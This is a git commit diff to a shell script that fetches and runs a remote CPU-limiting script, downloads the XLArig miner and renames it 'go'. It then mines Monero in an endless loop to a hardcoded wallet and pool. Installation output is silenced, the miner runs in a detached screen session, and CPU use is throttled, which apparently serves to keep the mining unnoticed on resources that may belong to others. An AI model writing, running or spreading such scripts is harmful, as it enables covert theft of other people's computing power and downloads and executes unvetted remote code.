650e8df0452f158022299f9959457ef9dc0a9df7
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-11 22:54:01 +0800

    Update lablabxmr.sh

--- lablabxmr.sh
+++ lablabxmr.sh
@@ -4,14 +4,15 @@
 #XMR
 sudo apt update > /dev/null 2>&1
 sudo apt install cpulimit > /dev/null 2>&1
+sudo apt install unzip > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
 wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh 
 chmod +x limiting.sh 
 screen -dmS randum ./limiting.sh xmrig 65 75 
-wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz 
-tar xf xmrig-6.11.2-linux-x64.tar.gz 
-mv xmrig-6.11.2/xmrig go
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
+unzip XLArig-v5.2.2-linux-x86_64.zip
 ls
+mv xlarig go
 while [ 1 ]; do
 ./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o ca.monero.herominers.com:10191 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages 
 sleep 3
